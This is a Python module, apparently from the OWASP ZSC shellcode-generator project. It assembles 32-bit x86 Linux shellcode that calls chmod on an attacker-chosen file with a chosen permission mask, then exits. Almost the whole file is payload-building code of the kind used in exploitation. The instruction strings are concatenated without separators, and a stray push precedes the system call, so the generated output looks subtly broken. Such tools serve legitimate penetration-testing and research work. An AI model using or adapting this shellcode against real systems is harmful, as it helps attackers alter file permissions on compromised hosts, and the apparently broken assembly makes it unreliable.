
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module
from owasp_zsc.new_cores import stack


class Module(base_module.BasePayload):
    perm = base_module.OptString("", "Permission mask")  # TODO improve descr
    file_dest = base_module.OptString("", "File Target")  # TODO improve descr

    def generate(self):
        payload = "xor    %%eax, %%eax"
        payload += "push   %%eax"
        payload += stack.generate(self.file_dest, '%ebx', 'string')
        payload += "mov    %%esp, %%edx"
        payload += stack.generate(self.perm, '%ecx', 'int')
        payload += "push   %%edx"
        payload += "push   $0xf"
        payload += "pop    %%eax"
        payload += "push   $0x2a"
        payload += "int    $0x80"
        payload += "mov    $0x01, %%al"
        payload += "mov    $0x01, %%bl"
        payload += "int    $0x80"

        return payload

    def run(self):
        print(self.generate())